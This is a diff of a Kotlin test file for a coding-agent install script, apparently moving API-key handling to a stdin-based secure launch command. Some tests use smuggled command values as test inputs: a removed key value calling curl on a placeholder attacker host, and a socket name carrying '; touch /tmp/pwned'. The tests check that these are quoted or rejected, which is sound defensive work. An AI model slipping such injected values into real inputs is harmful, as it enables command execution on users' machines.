@@ -141,21 +141,26 @@ class AgentInstallScriptTest {
 
     // ---- API key ----
 
-    @Test fun keyExportStartsWithASpaceToStayOutOfHistory() {
-        val command = AgentInstallScript.exportKeyCommand("ANTHROPIC_API_KEY", "sk-test-123")
-        assertTrue(command.startsWith(" "), "a key export must not land in shell history")
+    @Test fun secureLaunchUsesStdinWithoutHistoryWorkarounds() {
+        val command = AgentInstallScript.secureLaunchCommand(CodingAgent.CLAUDE_CODE, "terminal-agent-test")
+        assertTrue("read -r ANTHROPIC_API_KEY" in command)
+        assertTrue("set +x; set +v" in command)
+        assertTrue("/dev/null" in command)
+        assertFalse("HISTCONTROL" in command)
+        assertFalse("history -d" in command)
+        assertTrue("new-session -d" in command)
     }
 
-    @Test fun keyExportQuotesTheKeyAndScrubsHistory() {
-        val command = AgentInstallScript.exportKeyCommand("ANTHROPIC_API_KEY", "sk-a'b;c")
-        assertTrue("""'sk-a'\''b;c'""" in command, "the key was not safely quoted: $command")
-        assertTrue("history -d" in command, "history is not scrubbed as a fallback")
+    @Test fun secureLaunchRejectsInjectedSocketNames() {
+        kotlin.test.assertFailsWith<IllegalArgumentException> {
+            AgentInstallScript.secureLaunchCommand(CodingAgent.CLAUDE_CODE, "terminal-agent-x; touch /tmp/pwned")
+        }
     }
 
-    @Test fun keyExportSurvivesAKeyThatLooksLikeAShellCommand() {
-        val command = AgentInstallScript.exportKeyCommand("K", "\$(curl evil.example)")
-        // Inside single quotes, command substitution is literal text.
-        assertTrue("'\$(curl evil.example)'" in command, command)
+    @Test fun secureLaunchDoesNotOfferAKeyToAnAgentWithoutKeyAuthentication() {
+        kotlin.test.assertFailsWith<IllegalArgumentException> {
+            AgentInstallScript.secureLaunchCommand(CodingAgent.OPENCODE, "terminal-agent-test")
+        }
     }
 
     // ---- launching ----
